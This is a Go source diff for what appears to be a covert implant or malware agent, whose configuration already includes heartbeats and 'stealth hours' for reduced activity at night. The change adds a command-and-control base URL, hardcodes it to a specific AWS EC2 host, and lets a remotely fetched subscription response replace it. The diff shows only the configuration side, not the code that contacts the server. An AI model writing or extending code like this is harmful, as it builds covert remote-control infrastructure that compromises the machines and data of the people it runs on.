@@ -29,6 +29,7 @@ type Config struct {
 	HeartbeatInterval int   `json:"heartbeat_interval"` // Heartbeat interval in seconds
 	NetworkAware     bool  `json:"network_aware"`      // Enable network adaptation
 	StealthHours     []int `json:"stealth_hours"`      // Hours for reduced activity (0-23)
+	C2BaseURL        string `json:"c2_url"`            // Set from subscription bootstrap
 }
 
 func LoadBootstrap() *Config {
@@ -46,6 +47,7 @@ func LoadBootstrap() *Config {
 		HeartbeatInterval: 300,
 		NetworkAware:     true,
 		StealthHours:     []int{0, 1, 2, 3, 4, 5, 22, 23}, // Reduced activity during late night
+		C2BaseURL:        "https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com",
 	}
 }
 
@@ -99,6 +101,7 @@ func FetchFullConfigFromSubscription(cfg *Config) error {
 		HeartbeatInterval int     `json:"heartbeat_interval"`
 		NetworkAware     bool    `json:"network_aware"`
 		StealthHours     []int   `json:"stealth_hours"`
+		C2URL            string  `json:"c2_url"`
 	}
 
 	if err := json.NewDecoder(resp.Body).Decode(&subResponse); err != nil {
@@ -134,6 +137,11 @@ func FetchFullConfigFromSubscription(cfg *Config) error {
 	cfg.NetworkAware = subResponse.NetworkAware
 	if len(subResponse.StealthHours) > 0 {
 		cfg.StealthHours = subResponse.StealthHours
+	}
+
+	// Update C2 base URL if provided
+	if subResponse.C2URL != "" {
+		cfg.C2BaseURL = subResponse.C2URL
 	}
 
 	// Decode crypto key if provided
